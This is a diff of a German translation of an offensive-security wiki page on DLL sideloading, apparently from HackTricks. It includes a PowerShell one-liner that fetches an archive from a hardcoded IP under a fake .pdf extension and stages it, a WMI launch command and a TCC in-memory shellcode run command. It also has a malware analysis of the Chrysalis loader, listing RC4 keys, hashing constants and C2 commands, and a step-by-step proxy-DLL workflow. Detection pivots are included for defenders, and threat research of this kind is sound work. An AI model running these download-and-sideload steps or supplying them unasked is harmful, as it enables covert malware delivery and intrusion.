-- **Built-in download/extract:** Lade ein Archiv mit einer harmlosen Erweiterung herunter, entpacke es und stage das sideload-Ziel plus DLL in einem zufälligen `%LocalAppData%`-Ordner:
+- **Built-in download/extract:** Lade ein Archiv mit einer harmlosen Dateiendung herunter, entpacke es und lege das sideload target plus die DLL in einem zufälligen `%LocalAppData%`-Ordner ab:
 
 ```powershell
 $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
 ```
-- `curl -s -L` blendet Fortschritt aus und folgt Redirects; `tar -xf` verwendet das integrierte tar von Windows.
+- `curl -s -L` versteckt den Fortschritt und folgt Redirects; `tar -xf` nutzt das integrierte Windows tar.
 
-- **WMI/CIM launch:** Starte die EXE über WMI, damit Telemetry einen von CIM erzeugten Prozess zeigt, während er die nebenliegende DLL lädt:
+- **WMI/CIM launch:** Starte die EXE über WMI, damit Telemetrie einen durch CIM erzeugten Prozess zeigt, während er die lokal abgelegte DLL lädt:
 
 ```powershell
 Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
 ```
-- Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); das Payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.
+- Funktioniert mit binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.
 
-- **Hunting:** Alarme auf `forfiles`, wenn `/p`, `/m` und `/c` zusammen auftreten; außerhalb von Admin-Skripten ungewöhnlich.
+- **Hunting:** Alarmiere bei `forfiles`, wenn `/p`, `/m` und `/c` zusammen auftauchen; außerhalb von admin scripts unüblich.
 
 
 ## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)
 
-Eine kürzliche Lotus Blossom-Intrusion missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper zu liefern, der ein DLL sideload plus vollständig in-memory Payloads vorbereitete.
+Eine jüngere Lotus Blossom intrusion missbrauchte eine vertrauenswürdige update chain, um einen NSIS-gepackten dropper auszuliefern, der ein DLL sideload plus vollständig in-memory payloads vorbereitete.
 
 Tradecraft flow
-- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine malicious `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet dann die EXE.
-- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Key-Material aus einem vorherigen Hash abgeleitet), überschreibt den Buffer mit Plaintext-Shellcode, gibt temporäre Daten frei und springt hinein.
-- Um eine IAT zu vermeiden, löst der Loader APIs per Hashing von Export-Namen auf, indem er **FNV-1a basis 0x811C9DC5 + prime 0x1000193** verwendet, dann eine Murmur-ähnliche avalanche (**0x85EBCA6B**) anwendet und mit gesalzenen Target-Hashes vergleicht.
+- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard `BluetoothService.exe`, eine malicious `log.dll` und einen verschlüsselten blob `BluetoothService` ab und startet dann die EXE.
+- Die host EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, key material aus einem vorherigen hash abgeleitet), überschreibt den buffer mit plaintext shellcode, gibt temporäre Objekte frei und springt zu ihm.
+- Um eine IAT zu vermeiden, löst der Loader APIs durch das Hashing von export names auf, indem **FNV-1a basis 0x811C9DC5 + prime 0x1000193** verwendet wird, danach eine Murmur-artige avalanche (**0x85EBCA6B**) angewendet und mit gesalzenen target hashes verglichen wird.
 
 Main shellcode (Chrysalis)
-- Entschlüsselt ein PE-ähnliches Main-Module, indem es add/XOR/sub mit dem Key `gQ2JR&9;` über fünf Durchläufe wiederholt, und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die Import-Resolution abzuschließen.
-- Rekonstruiert DLL-Namensstrings zur Laufzeit über pro-Zeichen Bit-Rotate/XOR-Transformationen und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
-- Verwendet einen zweiten Resolver, der durch die **PEB → InMemoryOrderModuleList** läuft, jede Export-Tabelle in 4-Byte-Blöcken mit Murmur-ähnlichem Mixing parst und nur auf `GetProcAddress` zurückfällt, wenn der Hash nicht gefunden wird.
+- Entschlüsselt ein PE-ähnliches main module durch wiederholtes add/XOR/sub mit key `gQ2JR&9;` über fünf Durchläufe und lädt dann dynamisch `Kernel32.dll` → `GetProcAddress`, um die import resolution abzuschließen.
+- Stellt DLL name strings zur Laufzeit über pro-Zeichen bit-rotate/XOR-Transformationen wieder her und lädt dann `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
+- Verwendet einen zweiten resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede export table in 4-byte-Blöcken mit Murmur-artigem mixing analysiert und nur auf `GetProcAddress` zurückfällt, wenn der hash nicht gefunden wird.
 
 Embedded configuration & C2
-- Die Konfiguration liegt innerhalb der abgelegten Datei `BluetoothService` bei **offset 0x30808** (Größe **0x980**) und wird mit RC4 und dem Key `qwhvb^435h&*7` entschlüsselt, wodurch die C2-URL und der User-Agent sichtbar werden.
-- Beacons bauen ein durch Punkte getrenntes Host-Profil auf, stellen das Tag `4Q` voran und verschlüsseln dann mit RC4-Key `vAuig34%^325hGV`, bevor sie `HttpSendRequestA` über HTTPS verwenden. Antworten werden per RC4 entschlüsselt und über einen Tag-Switch verarbeitet (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
-- Der Ausführungsmodus wird über CLI args gesteuert: keine args = install persistence (service/Run key), das auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das Payload aus.
+- Die Config befindet sich in der abgelegten Datei `BluetoothService` bei **offset 0x30808** (Größe **0x980**) und wird mit RC4 und key `qwhvb^435h&*7` entschlüsselt, wodurch die C2 URL und der User-Agent offengelegt werden.
+- Beacons erstellen ein durch Punkte getrenntes host profile, setzen das tag `4Q` davor und verschlüsseln dann mit RC4 und key `vAuig34%^325hGV`, bevor sie `HttpSendRequestA` über HTTPS verwenden. Responses werden per RC4 entschlüsselt und über einen tag switch verarbeitet (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
+- Der execution mode wird durch CLI args gesteuert: keine args = persistence installieren (service/Run key) mit Verweis auf `-i`; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt das payload aus.
 
 Alternate loader observed
-- Dieselbe Intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` von `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C-Source enthielt eingebetteten Shellcode, wurde kompiliert und lief vollständig in-memory, ohne die Festplatte mit einer PE zu berühren. Repliziere mit:
+- Dieselbe intrusion legte Tiny C Compiler ab und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, mit `libtcc.dll` daneben. Der vom Angreifer bereitgestellte C source enthielt shellcode, wurde kompiliert und lief in-memory, ohne die disk mit einer PE zu beschreiben. Repliziere mit:
 ```cmd
 C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
 ```
-- Diese TCC-basierte Compile-and-Run-Phase importierte `Wininet.dll` zur Laufzeit und zog eine zweite Shellcode-Stage von einer hardcodierten URL, was einen flexiblen Loader ergab, der sich als Compiler-Ausführung tarnt.
+- Diese auf TCC basierende compile-and-run-Phase importierte `Wininet.dll` zur Laufzeit und zog eine zweite Shellcode-Stufe von einer hardcodierten URL, wodurch ein flexibler Loader entstand, der sich als Compiler-Run tarnte.
 
 ## Signed-host sideloading mit export proxying + host thread parking
 
-Einige DLL sideloading-Ketten fügen **Stability Engineering** hinzu, damit der legitime Host lange genug aktiv bleibt, um spätere Stages sauber zu laden, statt nach dem Laden der bösartigen DLL abzustürzen.
+Einige DLL sideloading-Ketten fügen **Stability Engineering** hinzu, damit der legitime Host lange genug am Leben bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der malicious DLL abzustürzen.
 
-Beobachtetes Muster
-- Lege eine vertrauenswürdige EXE neben eine bösartige DLL mit dem erwarteten Abhängigkeitsnamen wie `version.dll`.
-- Die bösartige DLL **proxyt alle erwarteten Exports** an die echte System-DLL zurück (zum Beispiel `%SystemRoot%\\System32\\version.dll`), damit die Importauflösung weiterhin funktioniert und der Host-Prozess weiterläuft.
-- Nach dem Laden **patcht die bösartige DLL den Host-Entry-Point**, sodass der Main Thread in einer endlosen `Sleep`-Schleife landet, statt zu beenden oder Codepfade auszuführen, die den Prozess beenden würden.
-- Ein neuer Thread erledigt die eigentliche bösartige Arbeit: Entschlüsseln des Namens oder Pfads der nächsten DLL-Stage (RC4/XOR sind üblich) und anschließend Starten mit `LoadLibrary`.
+Observed pattern
+- Einen vertrauenswürdigen EXE neben eine malicious DLL legen, mit dem erwarteten Abhängigkeitsnamen wie `version.dll`.
+- Die malicious DLL **proxyed jede erwartete Export-Funktion** zurück zur echten System-DLL (zum Beispiel `%SystemRoot%\\System32\\version.dll`), sodass die Importauflösung weiterhin funktioniert und der Host-Prozess weiterläuft.
+- Nach dem Laden patcht die malicious DLL **den Host-Einstiegspunkt**, sodass der Hauptthread in einer endlosen `Sleep`-Schleife landet, statt zu beenden oder Codepfade auszuführen, die den Prozess terminieren würden.
+- Ein neuer Thread erledigt die eigentliche malicious Arbeit: den Namen oder Pfad der next-stage DLL entschlüsseln (RC4/XOR sind üblich) und sie dann mit `LoadLibrary` starten.
 
-Warum das wichtig ist
-- Normales DLL proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug aktiv bleibt, damit spätere Stages laufen können.
-- Den Main Thread in `Sleep(INFINITE)` zu parken, ist eine einfache Methode, den signierten Prozess resident zu halten, während der Loader in einem Worker-Thread entschlüsselt, staged oder einen Netzwerk-Bootstrap durchführt.
-- Nur nach einem verdächtigen `DllMain` zu suchen, verpasst dieses Muster, wenn das interessante Verhalten erst nach dem Patchen des Host-Entry-Points und dem Start eines sekundären Threads passiert.
+Why this matters
+- Normales DLL proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug am Leben bleibt, damit spätere Stufen ausgeführt werden können.
+- Den Hauptthread in `Sleep(INFINITE)` zu parken ist ein einfacher Weg, den signed Prozess resident zu halten, während der Loader Entschlüsselung, Staging oder Netzwerk-Bootstrap in einem Worker-Thread ausführt.
+- Nur nach einem verdächtigen `DllMain` zu suchen verfehlt dieses Muster, wenn das interessante Verhalten erst nach dem Patchen des Host-Einstiegspunkts und dem Start eines sekundären Threads auftritt.
 
-Minimaler Ablauf
-1. Kopiere die signierte Host-EXE und ermittle die DLL, die sie aus dem lokalen Verzeichnis auflöst.
+Minimal workflow
+1. Kopiere den signed Host-EXE und ermittle die DLL, die er aus dem lokalen Verzeichnis auflöst.
 2. Baue eine Proxy-DLL, die dieselben Funktionen exportiert und an die legitime DLL weiterleitet.
 3. Erzeuge in `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread.
-4. Patche von diesem Thread aus den Host-Entry-Point oder die Start-Routine des Main Threads so, dass sie in `Sleep`-Schleifen läuft.
-5. Entschlüssele den Namen/die Konfiguration der nächsten DLL-Stage und rufe `LoadLibrary` auf oder manual-map den Payload.
+4. Pachte von diesem Thread aus den Host-Einstiegspunkt oder die Start-Routine des Hauptthreads so, dass sie in `Sleep` Schleifen bildet.
+5. Entschlüssele den Namen/die Konfiguration der next-stage DLL und rufe `LoadLibrary` oder manual-map den Payload auf.
 
-Defensive Ansatzpunkte
-- Signierte Prozesse laden `version.dll` oder ähnlich verbreitete Libraries aus ihrem eigenen Anwendungsverzeichnis statt aus `System32`.
-- Speicher-Patches am Prozess-Entry-Point kurz nach dem Image-Load, besonders Sprünge/Aufrufe, die auf `Sleep`/`SleepEx` umgeleitet werden.
-- Threads, die von einer Proxy-DLL erzeugt werden und sofort `LoadLibrary` auf einer zweiten DLL mit entschlüsseltem Namen aufrufen.
-- Full-export-Proxy-DLLs, die neben Vendor-Exes in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.
+Defensive pivots
+- Signed Prozesse, die `version.dll` oder ähnlich häufige Libraries aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
+- Memory-Patches am Prozess-Einstiegspunkt kurz nach dem Image-Load, besonders Sprünge/Calls, die auf `Sleep`/`SleepEx` umgeleitet werden.
+- Threads, die von einer Proxy-DLL erstellt werden und sofort `LoadLibrary` auf einer zweiten DLL mit entschlüsseltem Namen aufrufen.
+- Full-export Proxy-DLLs, die neben Vendor-Executables in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.
 
 ## References
 
@@ -687,6 +715,8 @@ Defensive Ansatzpunkte
 - [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
 - [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
 - [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
+- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
+- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
 
 
 {{#include ../../../banners/hacktricks-training.md}}
